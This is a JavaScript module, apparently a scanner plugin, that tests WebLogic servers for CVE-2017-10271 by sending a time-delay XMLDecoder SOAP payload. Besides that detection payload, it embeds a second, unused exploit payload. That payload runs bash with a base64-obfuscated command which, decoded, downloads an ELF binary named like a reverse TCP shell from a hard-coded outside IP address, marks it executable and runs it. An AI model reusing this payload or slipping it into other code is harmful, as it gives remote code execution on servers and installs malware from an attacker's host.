module.exports={
	tags:"weblogic,CVE-2017-10271,10271",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	suport:g_szMyMsg,
	doCheck:function (url,fnCbk)
	{
		var _t = this, szOld = url;
		// CoordinatorPortType
		// CoordinatorPortType11
		url = url.substr(0, url.indexOf('/',13)) + '/wls-wsat/CoordinatorPortType';
		var s = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java version="1.8.0_131" class="java.beans.XMLDecoder">
		<void class="java.lang.Thread">
		  	<void method="sleep">	
		  		<long>{num}</long>
		  	</void>
		</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
*/}),s1 = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -D|sh]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/});
		var nNum = new Date().getTime()/1000,nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
		s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// s = s1;

		request(fnOptHeader({
			timeout: nTime + 5000,
			method: 'POST',
			uri: url,
			body:s
		    ,headers:
		    {
		    	"Host":'127.0.0.1:7001',
		    	"User-Agent": g_szUa,
		    	"content-type":"text/xml"
		    }})
		  , function (error, response, body)
		  {
		  	if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
		  	{
		  		console.log("没有发现WebLogic CVE-2017-10271 反序列化");
		  		return;
		  	}
		  	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
		  	// console.log(String(body));
		  	// console.log([nT,nT2]);
		  	
	  		if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
	  		{
	  			var r = {vul:true,"body":String(body),"url":szOld,"send":s,"des":
	  				"发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000+5) + "秒，实际返回耗时：" + nT + "秒"};
	  			// console.log(r);
	  			fnCbk(r,_t);
	  		}
	  		else console.log("没有发现WebLogic CVE-2017-10271 反序列化");
	  		// console.log(body);
		   }
		 );
	}
};